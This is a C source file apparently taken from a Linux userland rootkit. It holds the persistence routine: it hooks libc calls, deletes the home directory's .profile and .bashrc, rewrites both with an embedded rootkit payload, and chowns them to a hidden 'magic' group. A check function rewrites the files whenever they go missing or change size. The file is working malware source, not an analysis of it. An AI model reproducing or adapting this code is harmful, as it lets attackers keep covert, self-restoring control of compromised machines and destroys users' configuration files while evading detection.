#include "bashrc.h"
#define BASHRC_PATH HOMEDIR"/.bashrc"
#define PROFILE_PATH HOMEDIR"/.profile"
int writebashrc(void){
    DIR *dp;
    FILE *pfp,*bfp;
    char curchar;
    gid_t magicgid;

    hook(COPENDIR, CFOPEN, CUNLINK);
    
    dp = call(COPENDIR, HOMEDIR);
    if(dp == NULL) return -1;
    closedir(dp);

    call(CUNLINK, PROFILE_PATH);
    call(CUNLINK, BASHRC_PATH);

    pfp = call(CFOPEN, PROFILE_PATH, "a");
    if(pfp == NULL)
        return -1;

    bfp = call(CFOPEN, BASHRC_PATH, "a");
    if(bfp == NULL){
        fclose(pfp);
        return -1;
    }

    for(int i = 0; i < RKBASHRC_SIZE; i++){
        curchar = rkbashrc[i];
        fputc(curchar, pfp);
        fputc(curchar, bfp);
    }

    fclose(pfp);
    fclose(bfp);

    magicgid = readgid();
    chown_path(PROFILE_PATH, magicgid);
    chown_path(BASHRC_PATH, magicgid);

    return 0;
}

void checkbashrc(void){
    if(!rkprocup())
        return;

    struct stat rcstat;
    memset(&rcstat, 0, sizeof(struct stat));
    hook(C__XSTAT);

    int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
    if((statstat < 0 && errno == ENOENT) || (statstat != -1 && rcstat.st_size != RKBASHRC_SIZE)){
        writebashrc();
        return;
    }
}